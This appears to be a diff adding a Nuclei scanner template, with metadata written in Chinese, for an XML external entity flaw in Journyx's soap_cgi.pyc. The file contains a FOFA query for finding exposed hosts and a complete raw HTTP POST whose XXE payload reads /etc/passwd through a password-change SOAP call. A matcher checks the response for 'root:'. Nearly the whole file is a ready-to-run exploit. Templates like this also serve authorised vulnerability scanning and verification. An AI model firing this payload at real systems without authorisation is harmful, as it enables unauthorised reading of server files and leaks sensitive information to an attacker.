@@ -1,0 +1,39 @@
+id: Journyx-soap_cgi-xxe
+
+info:
+  name: "Journyx soap_cgi.pyc 组件XML外部实体注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Journyx"
+      Journyx项目管理软件的soap_cgi.pyc组件存在XML外部实体注入漏洞。攻击者可通过构造恶意XML实体，绕过身份验证机制，读取服务器端敏感文件内容，导致系统敏感信息泄露，从而对系统安全构成严重威胁。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486243&idx=1&sn=a1baf3dc334815d10c30b70c6862c2a8&chksm=c267be10f5103706988ed4ad96ad905a778cb428ccebab1a95e564384afd8d12cc40860acf51&token=1742030890&lang=zh_CN#rd
+  tags: Journyx
+
+
+http:
+- raw:
+  - |
+    POST /jtcgi/soap_cgi.pyc HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/xml
+
+    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
